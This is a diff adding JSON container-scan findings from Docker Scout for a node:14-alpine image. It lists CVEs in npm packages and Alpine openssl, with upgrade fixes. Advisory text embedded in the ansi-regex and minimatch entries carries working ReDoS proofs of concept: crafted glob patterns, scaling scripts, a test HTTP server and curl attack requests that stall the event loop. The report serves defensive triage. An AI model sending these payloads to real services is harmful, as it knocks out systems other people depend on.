+      "description": "ansi-regex is vulnerable to Inefficient Regular Expression Complexity which could lead to a denial of service when parsing invalid ANSI escape codes.\n\n**Proof of Concept**\n```js\nimport ansiRegex from 'ansi-regex';\nfor(var i = 1; i <= 50000; i++) {\n    var time = Date.now();\n    var attack_str = \"\\u001B[\"+\";\".repeat(i*10000);\n    ansiRegex().test(attack_str)\n    var time_cost = Date.now() - time;\n    console.log(\"attack_str.length: \" + attack_str.length + \": \" + time_cost+\" ms\")\n}\n```\nThe ReDOS is mainly due to the sub-patterns `[[\\\\]()#;?]*` and `(?:;[-a-zA-Z\\\\d\\\\/#&.:=?%@~_]*)*`",
+      "cve": "CVE-2021-3807",
+      "severity": "High",
+      "confidence": "Unknown",
+      "solution": "Upgrade ansi-regex@4.1.0 to 4.1.1",
+      "scanner": {
+        "id": "docker-scout",
+        "name": "Docker Scout"
+      },
+      "location": {
+        "dependency": {
+          "package": {
+            "name": "pkg:npm/ansi-regex@4.1.0"
+          },
+          "version": "4.1.0"
+        },
+        "operating_system": "alpine 3.17",
+        "image": "node:14-alpine"
+      },
+      "identifiers": [
+        {
+          "type": "cve",
+          "name": "CVE-2021-3807",
+          "value": "CVE-2021-3807",
+          "url": "https://scout.docker.com/v/CVE-2021-3807?s=github&n=ansi-regex&t=npm&vr=%3E%3D4.0.0%2C%3C4.1.1"
+        }
+      ],
+      "links": [
+        {
+          "url": "https://scout.docker.com/v/CVE-2021-3807?s=github&n=ansi-regex&t=npm&vr=%3E%3D4.0.0%2C%3C4.1.1"
+        }
+      ]
+    },
+    {
+      "id": "382c70344e83bb90aff808422587616d3f9e56c7a37662e36705044a66a2d549",
+      "category": "container_scanning",
+      "message": "CVE-2021-3807 on ansi-regex@3.0.0",
+      "description": "ansi-regex is vulnerable to Inefficient Regular Expression Complexity which could lead to a denial of service when parsing invalid ANSI escape codes.\n\n**Proof of Concept**\n```js\nimport ansiRegex from 'ansi-regex';\nfor(var i = 1; i <= 50000; i++) {\n    var time = Date.now();\n    var attack_str = \"\\u001B[\"+\";\".repeat(i*10000);\n    ansiRegex().test(attack_str)\n    var time_cost = Date.now() - time;\n    console.log(\"attack_str.length: \" + attack_str.length + \": \" + time_cost+\" ms\")\n}\n```\nThe ReDOS is mainly due to the sub-patterns `[[\\\\]()#;?]*` and `(?:;[-a-zA-Z\\\\d\\\\/#&.:=?%@~_]*)*`",
+      "cve": "CVE-2021-3807",
+      "severity": "High",
+      "confidence": "Unknown",
+      "solution": "Upgrade ansi-regex@3.0.0 to 3.0.1",
+      "scanner": {
+        "id": "docker-scout",
+        "name": "Docker Scout"
+      },
+      "location": {
+        "dependency": {
+          "package": {
+            "name": "pkg:npm/ansi-regex@3.0.0"
+          },
+          "version": "3.0.0"
+        },
+        "operating_system": "alpine 3.17",
+        "image": "node:14-alpine"
+      },
+      "identifiers": [
+        {
+          "type": "cve",
+          "name": "CVE-2021-3807",
+          "value": "CVE-2021-3807",
+          "url": "https://scout.docker.com/v/CVE-2021-3807?s=github&n=ansi-regex&t=npm&vr=%3E%3D3.0.0%2C%3C3.0.1"
+        }
+      ],
+      "links": [
+        {
+          "url": "https://scout.docker.com/v/CVE-2021-3807?s=github&n=ansi-regex&t=npm&vr=%3E%3D3.0.0%2C%3C3.0.1"
+        }
+      ]
+    },
+    {
+      "id": "389dd29d43b7cda59b3e5307a6caa18a35c6a8dc096788f9d824ecaa03730a2e",
+      "category": "container_scanning",
+      "message": "CVE-2022-25881 on http-cache-semantics@3.8.1",
+      "description": "http-cache semantics contains an Inefficient Regular Expression Complexity , leading to Denial of Service. This affects versions of the package http-cache-semantics before 4.1.1. The issue can be exploited via malicious request header values sent to a server, when that server reads the cache policy from the request using this library.",
+      "cve": "CVE-2022-25881",
+      "severity": "High",
+      "confidence": "Unknown",
+      "solution": "Upgrade http-cache-semantics@3.8.1 to 4.1.1",
+      "scanner": {
+        "id": "docker-scout",
+        "name": "Docker Scout"
+      },
+      "location": {
+        "dependency": {
+          "package": {
+            "name": "pkg:npm/http-cache-semantics@3.8.1"
+          },
+          "version": "3.8.1"
+        },
+        "operating_system": "alpine 3.17",
+        "image": "node:14-alpine"
+      },
+      "identifiers": [
+        {
+          "type": "cve",
+          "name": "CVE-2022-25881",
+          "value": "CVE-2022-25881",
+          "url": "https://scout.docker.com/v/CVE-2022-25881?s=github&n=http-cache-semantics&t=npm&vr=%3C4.1.1"
+        }
+      ],
+      "links": [
+        {
+          "url": "https://scout.docker.com/v/CVE-2022-25881?s=github&n=http-cache-semantics&t=npm&vr=%3C4.1.1"
+        }
+      ]
+    },
+    {
+      "id": "8ebc85677640f2df28f709301eb03287b1b1856c778a4332778ee48b6c4b09ab",
+      "category": "container_scanning",
+      "message": "CVE-2022-25883 on semver@5.7.1",
+      "description": "Versions of the package semver before 7.5.2 on the 7.x branch, before 6.3.1 on the 6.x branch, and all other versions before 5.7.2 are vulnerable to Regular Expression Denial of Service (ReDoS) via the function new Range, when untrusted user data is provided as a range.",
+      "cve": "CVE-2022-25883",
+      "severity": "High",
+      "confidence": "Unknown",
+      "solution": "Upgrade semver@5.7.1 to 5.7.2",
+      "scanner": {
+        "id": "docker-scout",
+        "name": "Docker Scout"
+      },
+      "location": {
+        "dependency": {
+          "package": {
+            "name": "pkg:npm/semver@5.7.1"
+          },
+          "version": "5.7.1"
+        },
+        "operating_system": "alpine 3.17",
+        "image": "node:14-alpine"
+      },
+      "identifiers": [
+        {
+          "type": "cve",
+          "name": "CVE-2022-25883",
+          "value": "CVE-2022-25883",
+          "url": "https://scout.docker.com/v/CVE-2022-25883?s=github&n=semver&t=npm&vr=%3E%3D2.0.0-alpha%2C%3C5.7.2"
+        }
+      ],
+      "links": [
+        {
+          "url": "https://scout.docker.com/v/CVE-2022-25883?s=github&n=semver&t=npm&vr=%3E%3D2.0.0-alpha%2C%3C5.7.2"
+        }
+      ]
+    },
+    {
+      "id": "5a6b0863f8774f8b8065325044de7bc6fb2bfadcca2968646cbb795536f24e3f",
+      "category": "container_scanning",
+      "message": "CVE-2023-5363 on alpine/openssl@3.0.8-r3",
+      "cve": "CVE-2023-5363",
+      "severity": "High",
+      "confidence": "Unknown",
+      "solution": "Upgrade alpine/openssl@3.0.8-r3 to 3.0.12-r0",
+      "scanner": {
+        "id": "docker-scout",
+        "name": "Docker Scout"
+      },
+      "location": {
+        "dependency": {
+          "package": {
+            "name": "pkg:apk/alpine/openssl@3.0.8-r3?os_name=alpine&os_version=3.17"
+          },
+          "version": "3.0.8-r3"
+        },
+        "operating_system": "alpine 3.17",
+        "image": "node:14-alpine"
+      },
+      "identifiers": [
+        {
+          "type": "cve",
+          "name": "CVE-2023-5363",
+          "value": "CVE-2023-5363",
+          "url": "https://scout.docker.com/v/CVE-2023-5363?s=alpine&n=openssl&ns=alpine&t=apk&osn=alpine&osv=3.17&vr=%3C3.0.12-r0"
+        }
+      ],
+      "links": [
+        {
+          "url": "https://scout.docker.com/v/CVE-2023-5363?s=alpine&n=openssl&ns=alpine&t=apk&osn=alpine&osv=3.17&vr=%3C3.0.12-r0"
+        }
+      ]
+    },
+    {
+      "id": "835983e7d4d3d3452ebc81c861273c615d673432a4ad46a45517e44f45f35149",
+      "category": "container_scanning",
+      "message": "CVE-2024-4741 on alpine/openssl@3.0.8-r3",
+      "cve": "CVE-2024-4741",
+      "severity": "High",
+      "confidence": "Unknown",
+      "solution": "Upgrade alpine/openssl@3.0.8-r3 to 3.0.14-r0",
+      "scanner": {
+        "id": "docker-scout",
+        "name": "Docker Scout"
+      },
+      "location": {
+        "dependency": {
+          "package": {
+            "name": "pkg:apk/alpine/openssl@3.0.8-r3?os_name=alpine&os_version=3.17"
+          },
+          "version": "3.0.8-r3"
+        },
+        "operating_system": "alpine 3.17",
+        "image": "node:14-alpine"
+      },
+      "identifiers": [
+        {
+          "type": "cve",
+          "name": "CVE-2024-4741",
+          "value": "CVE-2024-4741",
+          "url": "https://scout.docker.com/v/CVE-2024-4741?s=alpine&n=openssl&ns=alpine&t=apk&osn=alpine&osv=3.17&vr=%3C3.0.14-r0"
+        }
+      ],
+      "links": [
+        {
+          "url": "https://scout.docker.com/v/CVE-2024-4741?s=alpine&n=openssl&ns=alpine&t=apk&osn=alpine&osv=3.17&vr=%3C3.0.14-r0"
+        }
+      ]
+    },
+    {
+      "id": "2eece574e6f32be6959e13edbf6f487380f50185007a4c869412b7b540c9afbe",
+      "category": "container_scanning",
+      "message": "CVE-2024-6119 on alpine/openssl@3.0.8-r3",
+      "cve": "CVE-2024-6119",
+      "severity": "High",
+      "confidence": "Unknown",
+      "solution": "Upgrade alpine/openssl@3.0.8-r3 to 3.0.15-r0",
+      "scanner": {
+        "id": "docker-scout",
+        "name": "Docker Scout"
+      },
+      "location": {
+        "dependency": {
+          "package": {
+            "name": "pkg:apk/alpine/openssl@3.0.8-r3?os_name=alpine&os_version=3.17"
+          },
+          "version": "3.0.8-r3"
+        },
+        "operating_system": "alpine 3.17",
+        "image": "node:14-alpine"
+      },
+      "identifiers": [
+        {
+          "type": "cve",
+          "name": "CVE-2024-6119",
+          "value": "CVE-2024-6119",
+          "url": "https://scout.docker.com/v/CVE-2024-6119?s=alpine&n=openssl&ns=alpine&t=apk&osn=alpine&osv=3.17&vr=%3C3.0.15-r0"
+        }
+      ],
+      "links": [
+        {
+          "url": "https://scout.docker.com/v/CVE-2024-6119?s=alpine&n=openssl&ns=alpine&t=apk&osn=alpine&osv=3.17&vr=%3C3.0.15-r0"
+        }
+      ]
+    },
+    {
+      "id": "181e4952b9cc0b643f5d791db2d3d8660740ca6391f8c12aa872a6126b67976d",
+      "category": "container_scanning",
+      "message": "CVE-2025-69420 on alpine/openssl@3.0.8-r3",
+      "cve": "CVE-2025-69420",
+      "severity": "High",
+      "confidence": "Unknown",
+      "solution": "Upgrade alpine/openssl@3.0.8-r3 to 3.0.19-r0",
+      "scanner": {
+        "id": "docker-scout",
+        "name": "Docker Scout"
+      },
+      "location": {
+        "dependency": {
+          "package": {
+            "name": "pkg:apk/alpine/openssl@3.0.8-r3?os_name=alpine&os_version=3.17"
+          },
+          "version": "3.0.8-r3"
+        },
+        "operating_system": "alpine 3.17",
+        "image": "node:14-alpine"
+      },
+      "identifiers": [
+        {
+          "type": "cve",
+          "name": "CVE-2025-69420",
+          "value": "CVE-2025-69420",
+          "url": "https://scout.docker.com/v/CVE-2025-69420?s=alpine&n=openssl&ns=alpine&t=apk&osn=alpine&osv=3.17&vr=%3C3.0.19-r0"
+        }
+      ],
+      "links": [
+        {
+          "url": "https://scout.docker.com/v/CVE-2025-69420?s=alpine&n=openssl&ns=alpine&t=apk&osn=alpine&osv=3.17&vr=%3C3.0.19-r0"
+        }
+      ]
+    },
+    {
+      "id": "4298d9bc8040a1be3ae5c38bef48081664b53d1dd32908a7201bf21429ce710b",
+      "category": "container_scanning",
+      "message": "CVE-2025-69421 on alpine/openssl@3.0.8-r3",
+      "cve": "CVE-2025-69421",
+      "severity": "High",
+      "confidence": "Unknown",
+      "solution": "Upgrade alpine/openssl@3.0.8-r3 to 3.0.19-r0",
+      "scanner": {
+        "id": "docker-scout",
+        "name": "Docker Scout"
+      },
+      "location": {
+        "dependency": {
+          "package": {
+            "name": "pkg:apk/alpine/openssl@3.0.8-r3?os_name=alpine&os_version=3.17"
+          },
+          "version": "3.0.8-r3"
+        },
+        "operating_system": "alpine 3.17",
+        "image": "node:14-alpine"
+      },
+      "identifiers": [
+        {
+          "type": "cve",
+          "name": "CVE-2025-69421",
+          "value": "CVE-2025-69421",
+          "url": "https://scout.docker.com/v/CVE-2025-69421?s=alpine&n=openssl&ns=alpine&t=apk&osn=alpine&osv=3.17&vr=%3C3.0.19-r0"
+        }
+      ],
+      "links": [
+        {
+          "url": "https://scout.docker.com/v/CVE-2025-69421?s=alpine&n=openssl&ns=alpine&t=apk&osn=alpine&osv=3.17&vr=%3C3.0.19-r0"
+        }
+      ]
+    },
+    {
+      "id": "7eb145805aeea959fe4f022044418dc8904f64bd9756da830a9f2595962ff30e",
+      "category": "container_scanning",
+      "message": "CVE-2025-9230 on alpine/openssl@3.0.8-r3",
+      "cve": "CVE-2025-9230",
+      "severity": "High",
+      "confidence": "Unknown",
+      "solution": "Upgrade alpine/openssl@3.0.8-r3 to 3.0.19-r0",
+      "scanner": {
+        "id": "docker-scout",
+        "name": "Docker Scout"
+      },
+      "location": {
+        "dependency": {
+          "package": {
+            "name": "pkg:apk/alpine/openssl@3.0.8-r3?os_name=alpine&os_version=3.17"
+          },
+          "version": "3.0.8-r3"
+        },
+        "operating_system": "alpine 3.17",
+        "image": "node:14-alpine"
+      },
+      "identifiers": [
+        {
+          "type": "cve",
+          "name": "CVE-2025-9230",
+          "value": "CVE-2025-9230",
+          "url": "https://scout.docker.com/v/CVE-2025-9230?s=alpine&n=openssl&ns=alpine&t=apk&osn=alpine&osv=3.17&vr=%3C3.0.19-r0"
+        }
+      ],
+      "links": [
+        {
+          "url": "https://scout.docker.com/v/CVE-2025-9230?s=alpine&n=openssl&ns=alpine&t=apk&osn=alpine&osv=3.17&vr=%3C3.0.19-r0"
+        }
+      ]
+    },
+    {
+      "id": "641b2d07b9d347127a060680066f2653684fb855cea4204d5c87106455f73093",
+      "category": "container_scanning",
+      "message": "CVE-2026-27903 on minimatch@3.1.2",
+      "description": "### Summary\n\n`matchOne()` performs unbounded recursive backtracking when a glob pattern contains multiple non-adjacent `**` (GLOBSTAR) segments and the input path does not match. The time complexity is O(C(n, k)) -- binomial -- where `n` is the number of path segments and `k` is the number of globstars. With k=11 and n=30, a call to the default `minimatch()` API stalls for roughly 5 seconds. With k=13, it exceeds 15 seconds. No memoization or call budget exists to bound this behavior.\n\n---\n\n### Details\n\nThe vulnerable loop is in `matchOne()` at [`src/index.ts#L960`](https://github.com/isaacs/minimatch/blob/v10.2.2/src/index.ts#L960):\n\n```typescript\nwhile (fr < fl) {\n  ..\n  if (this.matchOne(file.slice(fr), pattern.slice(pr), partial)) {\n    ..\n    return true\n  }\n  ..\n  fr++\n}\n```\n\nWhen a GLOBSTAR is encountered, the function tries to match the remaining pattern against every suffix of the remaining file segments. Each `**` multiplies the number of recursive calls by the number of remaining segments. With k non-adjacent globstars and n file segments, the total number of calls is C(n, k).\n\nThere is no depth counter, visited-state cache, or budget limit applied to this recursion. The call tree is fully explored before returning `false` on a non-matching input.\n\nMeasured timing with n=30 path segments:\n\n| k (globstars) | Pattern size | Time     |\n|---------------|--------------|----------|\n| 7             | 36 bytes     | ~154ms   |\n| 9             | 46 bytes     | ~1.2s    |\n| 11            | 56 bytes     | ~5.4s    |\n| 12            | 61 bytes     | ~9.7s    |\n| 13            | 66 bytes     | ~15.9s   |\n\n---\n\n### PoC\n\nTested on minimatch@10.2.2, Node.js 20.\n\n**Step 1 -- inline script**\n\n```javascript\nimport { minimatch } from 'minimatch'\n\n// k=9 globstars, n=30 path segments\n// pattern: 46 bytes, default options\nconst pattern = '**/a/**/a/**/a/**/a/**/a/**/a/**/a/**/a/**/a/b'\nconst path    = 'a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a'\n\nconst start = Date.now()\nminimatch(path, pattern)\nconsole.log(Date.now() - start + 'ms') // ~1200ms\n```\n\nTo scale the effect, increase k:\n\n```javascript\n// k=11 -> ~5.4s, k=13 -> ~15.9s\nconst k = 11\nconst pattern = Array.from({ length: k }, () => '**/a').join('/') + '/b'\nconst path    = Array(30).fill('a').join('/')\nminimatch(path, pattern)\n```\n\nNo special options are required. This reproduces with the default `minimatch()` call.\n\n**Step 2 -- HTTP server (event loop starvation proof)**\n\nThe following server demonstrates the event loop starvation effect. It is a minimal harness, not a claim that this exact deployment pattern is common:\n\n```javascript\n// poc1-server.mjs\nimport http from 'node:http'\nimport { URL } from 'node:url'\nimport { minimatch } from 'minimatch'\n\nconst PORT = 3000\n\nconst server = http.createServer((req, res) => {\n  const url = new URL(req.url, `http://localhost:${PORT}`)\n  if (url.pathname !== '/match') { res.writeHead(404); res.end(); return }\n\n  const pattern = url.searchParams.get('pattern') ?? ''\n  const path    = url.searchParams.get('path') ?? ''\n\n  const start  = process.hrtime.bigint()\n  const result = minimatch(path, pattern)\n  const ms     = Number(process.hrtime.bigint() - start) / 1e6\n\n  res.writeHead(200, { 'Content-Type': 'application/json' })\n  res.end(JSON.stringify({ result, ms: ms.toFixed(0) }) + '\\n')\n})\n\nserver.listen(PORT)\n```\n\nTerminal 1 -- start the server:\n```\nnode poc1-server.mjs\n```\n\nTerminal 2 -- send the attack request (k=11, ~5s stall) and immediately return to shell:\n```\ncurl \"http://localhost:3000/match?pattern=**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2Fb&path=a%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa\" &\n```\n\nTerminal 3 -- while the attack is in-flight, send a benign request:\n```\ncurl -w \"\\ntime_total: %{time_total}s\\n\" \"http://localhost:3000/match?pattern=**%2Fy%2Fz&path=x%2Fy%2Fz\"\n```\n\n**Observed output (Terminal 3):**\n```\n{\"result\":true,\"ms\":\"0\"}\n\ntime_total: 4.132709s\n```\n\nThe server reports `\"ms\":\"0\"` -- the legitimate request itself takes zero processing time. The 4+ second `time_total` is entirely time spent waiting for the event loop to be released by the attack request. Every concurrent user is blocked for the full duration of each attack call. Repeating the benign request while no attack is in-flight confirms the baseline:\n\n```\n{\"result\":true,\"ms\":\"0\"}\n\ntime_total: 0.001599s\n```\n\n---\n\n### Impact\n\nAny application where an attacker can influence the glob pattern passed to `minimatch()` is vulnerable. The realistic attack surface includes build tools and task runners that accept user-supplied glob arguments (ESLint, Webpack, Rollup config), multi-tenant systems where one tenant configures glob-based rules that run in a shared process, admin or developer interfaces that accept ignore-rule or filter configuration as globs, and CI/CD pipelines that evaluate user-submitted config files containing glob patterns. An attacker who can place a crafted pattern into any of these paths can stall the Node.js event loop for tens of seconds per invocation. The pattern is 56 bytes for a 5-second stall and does not require authentication in contexts where pattern input is part of the feature.",
+      "cve": "CVE-2026-27903",
+      "severity": "High",
+      "confidence": "Unknown",
+      "solution": "Upgrade minimatch@3.1.2 to 3.1.3",
+      "scanner": {
+        "id": "docker-scout",
+        "name": "Docker Scout"
+      },
+      "location": {
+        "dependency": {
+          "package": {
+            "name": "pkg:npm/minimatch@3.1.2"
+          },
+          "version": "3.1.2"
+        },
+        "operating_system": "alpine 3.17",
+        "image": "node:14-alpine"
+      },
+      "identifiers": [
+        {
+          "type": "cve",
+          "name": "CVE-2026-27903",
+          "value": "CVE-2026-27903",
+          "url": "https://scout.docker.com/v/CVE-2026-27903?s=github&n=minimatch&t=npm&vr=%3C3.1.3"
+        }
+      ],
+      "links": [
+        {
+          "url": "https://scout.docker.com/v/CVE-2026-27903?s=github&n=minimatch&t=npm&vr=%3C3.1.3"
+        }
+      ]
+    },
+    {
+      "id": "c2978e55080b79b6b373f04270b051befdbb839f84c63b9f51068cd2ffc923f4",
+      "category": "container_scanning",
+      "message": "CVE-2026-27904 on minimatch@3.1.2",
+      "description": "### Summary\n\nNested `*()` extglobs produce regexps with nested unbounded quantifiers (e.g. `(?:(?:a|b)*)*`), which exhibit catastrophic backtracking in V8. With a 12-byte pattern `*(*(*(a|b)))` and an 18-byte non-matching input, `minimatch()` stalls for over 7 seconds. Adding a single nesting level or a few input characters pushes this to minutes. This is the most severe finding: it is triggered by the default `minimatch()` API with no special options, and the minimum viable pattern is only 12 bytes. The same issue affects `+()` extglobs equally.\n\n---\n\n### Details\n\nThe root cause is in `AST.toRegExpSource()` at [`src/ast.ts#L598`](https://github.com/isaacs/minimatch/blob/v10.2.2/src/ast.ts#L598). For the `*` extglob type, the close token emitted is `)*` or `)?`, wrapping the recursive body in `(?:...)*`. When extglobs are nested, each level adds another `*` quantifier around the previous group:\n\n```typescript\n: this.type === '*' && bodyDotAllowed ? `)?`\n: `)${this.type}`\n```\n\nThis produces the following regexps:\n\n| Pattern              | Generated regex                          |\n|----------------------|------------------------------------------|\n| `*(a\\|b)`            | `/^(?:a\\|b)*$/`                          |\n| `*(*(a\\|b))`         | `/^(?:(?:a\\|b)*)*$/`                     |\n| `*(*(*(a\\|b)))`      | `/^(?:(?:(?:a\\|b)*)*)*$/`               |\n| `*(*(*(*(a\\|b))))` | `/^(?:(?:(?:(?:a\\|b)*)*)*)*$/`          |\n\nThese are textbook nested-quantifier patterns. Against an input of repeated `a` characters followed by a non-matching character `z`, V8's backtracking engine explores an exponential number of paths before returning `false`.\n\nThe generated regex is stored on `this.set` and evaluated inside `matchOne()` at [`src/index.ts#L1010`](https://github.com/isaacs/minimatch/blob/v10.2.2/src/index.ts#L1010) via `p.test(f)`. It is reached through the standard `minimatch()` call with no configuration.\n\nMeasured times via `minimatch()`:\n\n| Pattern              | Input              | Time       |\n|----------------------|--------------------|------------|\n| `*(*(a\\|b))`         | `a` x30 + `z`      | ~68,000ms  |\n| `*(*(*(a\\|b)))`      | `a` x20 + `z`      | ~124,000ms |\n| `*(*(*(*(a\\|b))))` | `a` x25 + `z`      | ~116,000ms |\n| `*(a\\|a)`            | `a` x25 + `z`      | ~2,000ms   |\n\nDepth inflection at fixed input `a` x16 + `z`:\n\n| Depth | Pattern              | Time         |\n|-------|----------------------|--------------|\n| 1     | `*(a\\|b)`            | 0ms          |\n| 2     | `*(*(a\\|b))`         | 4ms          |\n| 3     | `*(*(*(a\\|b)))`      | 270ms        |\n| 4     | `*(*(*(*(a\\|b))))` | 115,000ms    |\n\nGoing from depth 2 to depth 3 with a 20-character input jumps from 66ms to 123,544ms -- a 1,867x increase from a single added nesting level.\n\n---\n\n### PoC\n\nTested on minimatch@10.2.2, Node.js 20.\n\n**Step 1 -- verify the generated regexps and timing (standalone script)**\n\nSave as `poc4-validate.mjs` and run with `node poc4-validate.mjs`:\n\n```javascript\nimport { minimatch, Minimatch } from 'minimatch'\n\nfunction timed(fn) {\n  const s = process.hrtime.bigint()\n  let result, error\n  try { result = fn() } catch(e) { error = e }\n  const ms = Number(process.hrtime.bigint() - s) / 1e6\n  return { ms, result, error }\n}\n\n// Verify generated regexps\nfor (let depth = 1; depth <= 4; depth++) {\n  let pat = 'a|b'\n  for (let i = 0; i < depth; i++) pat = `*(${pat})`\n  const re = new Minimatch(pat, {}).set?.[0]?.[0]?.toString()\n  console.log(`depth=${depth} \"${pat}\" -> ${re}`)\n}\n// depth=1 \"*(a|b)\"          -> /^(?:a|b)*$/\n// depth=2 \"*(*(a|b))\"       -> /^(?:(?:a|b)*)*$/\n// depth=3 \"*(*(*(a|b)))\"    -> /^(?:(?:(?:a|b)*)*)*$/\n// depth=4 \"*(*(*(*(a|b))))\" -> /^(?:(?:(?:(?:a|b)*)*)*)*$/\n\n// Safe-length timing (exponential growth confirmation without multi-minute hang)\nconst cases = [\n  ['*(*(*(a|b)))', 15],   // ~270ms\n  ['*(*(*(a|b)))', 17],   // ~800ms\n  ['*(*(*(a|b)))', 19],   // ~2400ms\n  ['*(*(a|b))',    23],   // ~260ms\n  ['*(a|b)',      101],   // <5ms (depth=1 control)\n]\nfor (const [pat, n] of cases) {\n  const t = timed(() => minimatch('a'.repeat(n) + 'z', pat))\n  console.log(`\"${pat}\" n=${n}: ${t.ms.toFixed(0)}ms result=${t.result}`)\n}\n\n// Confirm noext disables the vulnerability\nconst t_noext = timed(() => minimatch('a'.repeat(18) + 'z', '*(*(*(a|b)))', { noext: true }))\nconsole.log(`noext=true: ${t_noext.ms.toFixed(0)}ms (should be ~0ms)`)\n\n// +() is equally affected\nconst t_plus = timed(() => minimatch('a'.repeat(17) + 'z', '+(+(+(a|b)))'))\nconsole.log(`\"+(+(+(a|b)))\" n=18: ${t_plus.ms.toFixed(0)}ms result=${t_plus.result}`)\n```\n\nObserved output:\n```\ndepth=1 \"*(a|b)\"          -> /^(?:a|b)*$/\ndepth=2 \"*(*(a|b))\"       -> /^(?:(?:a|b)*)*$/\ndepth=3 \"*(*(*(a|b)))\"    -> /^(?:(?:(?:a|b)*)*)*$/\ndepth=4 \"*(*(*(*(a|b))))\" -> /^(?:(?:(?:(?:a|b)*)*)*)*$/\n\"*(*(*(a|b)))\" n=15: 269ms result=false\n\"*(*(*(a|b)))\" n=17: 268ms result=false\n\"*(*(*(a|b)))\" n=19: 2408ms result=false\n\"*(*(a|b))\"    n=23: 257ms result=false\n\"*(a|b)\"       n=101: 0ms result=false\nnoext=true: 0ms (should be ~0ms)\n\"+(+(+(a|b)))\" n=18: 6300ms result=false\n```\n\n**Step 2 -- HTTP server (event loop starvation proof)**\n\nSave as `poc4-server.mjs`:\n\n```javascript\nimport http from 'node:http'\nimport { URL } from 'node:url'\nimport { minimatch } from 'minimatch'\n\nconst PORT = 3001\nhttp.createServer((req, res) => {\n  const url     = new URL(req.url, `http://localhost:${PORT}`)\n  const pattern = url.searchParams.get('pattern') ?? ''\n  const path    = url.searchParams.get('path') ?? ''\n\n  const start  = process.hrtime.bigint()\n  const result = minimatch(path, pattern)\n  const ms     = Number(process.hrtime.bigint() - start) / 1e6\n\n  console.log(`[${new Date().toISOString()}] ${ms.toFixed(0)}ms pattern=\"${pattern}\" path=\"${path.slice(0,30)}\"`)\n  res.writeHead(200, { 'Content-Type': 'application/json' })\n  res.end(JSON.stringify({ result, ms: ms.toFixed(0) }) + '\\n')\n}).listen(PORT, () => console.log(`listening on ${PORT}`))\n```\n\nTerminal 1 -- start the server:\n```\nnode poc4-server.mjs\n```\n\nTerminal 2 -- fire the attack (depth=3, 19 a's + z) and return immediately:\n```\ncurl \"http://localhost:3001/match?pattern=*%28*%28*%28a%7Cb%29%29%29&path=aaaaaaaaaaaaaaaaaaaz\" &\n```\n\nTerminal 3 -- send a benign request while the attack is in-flight:\n```\ncurl -w \"\\ntime_total: %{time_total}s\\n\" \"http://localhost:3001/match?pattern=*%28a%7Cb%29&path=aaaz\"\n```\n\n**Observed output -- Terminal 2 (attack):**\n```\n{\"result\":false,\"ms\":\"64149\"}\n```\n\n**Observed output -- Terminal 3 (benign, concurrent):**\n```\n{\"result\":false,\"ms\":\"0\"}\n\ntime_total: 63.022047s\n```\n\n**Terminal 1 (server log):**\n```\n[2026-02-20T09:41:17.624Z] pattern=\"*(*(*(a|b)))\" path=\"aaaaaaaaaaaaaaaaaaaz\"\n[2026-02-20T09:42:21.775Z] done in 64149ms result=false\n[2026-02-20T09:42:21.779Z] pattern=\"*(a|b)\" path=\"aaaz\"\n[2026-02-20T09:42:21.779Z] done in 0ms result=false\n```\n\nThe server reports `\"ms\":\"0\"` for the benign request -- the legitimate request itself requires no CPU time. The entire 63-second `time_total` is time spent waiting for the event loop to be released. The benign request was only dispatched after the attack completed, confirmed by the server log timestamps.\n\nNote: standalone script timing (~7s at n=19) is lower than server timing (64s) because the standalone script had warmed up V8's JIT through earlier sequential calls. A cold server hits the worst case. Both measurements confirm catastrophic backtracking -- the server result is the more realistic figure for production impact.\n\n---\n\n### Impact\n\nAny context where an attacker can influence the glob pattern passed to `minimatch()` is vulnerable. The realistic attack surface includes build tools and task runners that accept user-supplied glob arguments, multi-tenant platforms where users configure glob-based rules (file filters, ignore lists, include patterns), and CI/CD pipelines that evaluate user-submitted config files containing glob expressions. No evidence was found of production HTTP servers passing raw user input directly as the extglob pattern, so that framing is not claimed here.\n\nDepth 3 (`*(*(*(a|b)))`, 12 bytes) stalls the Node.js event loop for 7+ seconds with an 18-character input. Depth 2 (`*(*(a|b))`, 9 bytes) reaches 68 seconds with a 31-character input. Both the pattern and the input fit in a query string or JSON body without triggering the 64 KB length guard.\n\n`+()` extglobs share the same code path and produce equivalent worst-case behavior (6.3 seconds at depth=3 with an 18-character input, confirmed).\n\n**Mitigation available:** passing `{ noext: true }` to `minimatch()` disables extglob processing entirely and reduces the same input to 0ms. Applications that do not need extglob syntax should set this option when handling untrusted patterns.",
+      "cve": "CVE-2026-27904",
+      "severity": "High",
+      "confidence": "Unknown",
+      "solution": "Upgrade minimatch@3.1.2 to 3.1.4",
+      "scanner": {
+        "id": "docker-scout",
+        "name": "Docker Scout"
+      },
+      "location": {
+        "dependency": {
+          "package": {
+            "name": "pkg:npm/minimatch@3.1.2"
+          },
+          "version": "3.1.2"
+        },
+        "operating_system": "alpine 3.17",
+        "image": "node:14-alpine"
+      },
+      "identifiers": [
+        {
+          "type": "cve",
+          "name": "CVE-2026-27904",
+          "value": "CVE-2026-27904",
+          "url": "https://scout.docker.com/v/CVE-2026-27904?s=github&n=minimatch&t=npm&vr=%3C3.1.4"
+        }
+      ],
+      "links": [
+        {
+          "url": "https://scout.docker.com/v/CVE-2026-27904?s=github&n=minimatch&t=npm&vr=%3C3.1.4"
+        }
+      ]
+    },
+    {
+      "id": "508527478dc714f1b821eeef00a09abce7bed78e1884828fdc22284915c71ead",
+      "category": "container_scanning",
+      "message": "CVE-2024-21538 on cross-spawn@5.1.0",
+      "description": "Versions of the package cross-spawn before 7.0.5 are vulnerable to Regular Expression Denial of Service (ReDoS) due to improper input sanitization. An attacker can increase the CPU usage and crash the program by crafting a very large and well crafted string.",
+      "cve": "CVE-2024-21538",
+      "severity": "High",
+      "confidence": "Unknown",
+      "solution": "Upgrade cross-spawn@5.1.0 to 6.0.6",
+      "scanner": {
+        "id": "docker-scout",
+        "name": "Docker Scout"
+      },
+      "location": {
+        "dependency": {
+          "package": {
+            "name": "pkg:npm/cross-spawn@5.1.0"
+          },
